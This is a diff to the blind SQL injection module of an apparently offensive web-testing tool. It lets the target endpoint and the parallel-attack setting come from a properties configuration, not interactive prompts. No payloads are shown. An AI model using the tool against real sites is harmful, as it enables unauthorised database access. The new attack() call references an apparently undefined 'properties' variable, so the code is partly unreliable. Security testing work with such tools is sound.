@@ -181,14 +181,17 @@ def manualpre(bugs, bug2, pay, getrq):
             success.append(p)
     return success
 
-def manual0x00(web, parallel):
+def manual0x00(web, parallel, properties):
 
     #print(R+'\n    ========================')
     print(R+'\n     S Q L i  (Manual Mode)')
     print(R+'    ––·‹›·––·‹›·––·‹›·––·‹›·\n')
                  
     requests = session()
-    bug = input(O+' [#] Injectable Endpoint '+R+'(eg. /sqli/fetch.php?id=2)'+O+' :> ')
+    if properties["PARAM"][1] == " ":
+        bug = input(O+' [#] Injectable Endpoint '+R+'(eg. /sqli/fetch.php?id=2)'+O+' :> ')
+    else:
+        bug = properties["PARAM"][1]
     bugs = web + bug
     getrq = requests.get(bugs, timeout=7, verify=False)
 
@@ -242,9 +245,9 @@ def manual0x00(web, parallel):
             print(R + "\n [-] No payload succeeded."+C)
     else:
         print(R+' [-] Enter an URL with scope parameter...')
-        manual0x00(web, parallel)
+        manual0x00(web, parallel, properties)
 
-def blindsqli(web):
+def blindsqli(web, properties):
     begin = True
     while True:
         print(GR+' [*] Loading module SQLi...')
@@ -266,8 +269,11 @@ def blindsqli(web):
                         pay.append(payload)
                         begin = False
 
-            pa = input(" [?] Parallel Attack? (enter for not) :> ")
-            parallel = pa is not ""
+            if properties["PARALLEL"][1] == " ":
+                pa = input(" [?] Parallel Attack? (enter for not) :> ")
+                parallel = pa is not ""
+            else:
+                parallel = properties["PARALLEL"][1] == "1"
 
             print(O+'\n [#] Enter the type you want to proceed:\n')
             print(B+'   [1] '+C+'Manual Mode')
@@ -275,7 +281,7 @@ def blindsqli(web):
             p = input(O+' [#] TID :> ')
             if p == '1':
                 print(GR+' [*] Initializing manual mode...')
-                manual0x00(web, parallel)
+                manual0x00(web, parallel, properties)
             if p == '2':
                 print(GR+' [*] Loading automatic mode...')
                 auto0x00(web, parallel)
@@ -284,4 +290,4 @@ def blindsqli(web):
             print(R+' [-] Payloads file does not exist!')
 
 def attack(web):
-    blindsqli(web)
+    blindsqli(web, properties)
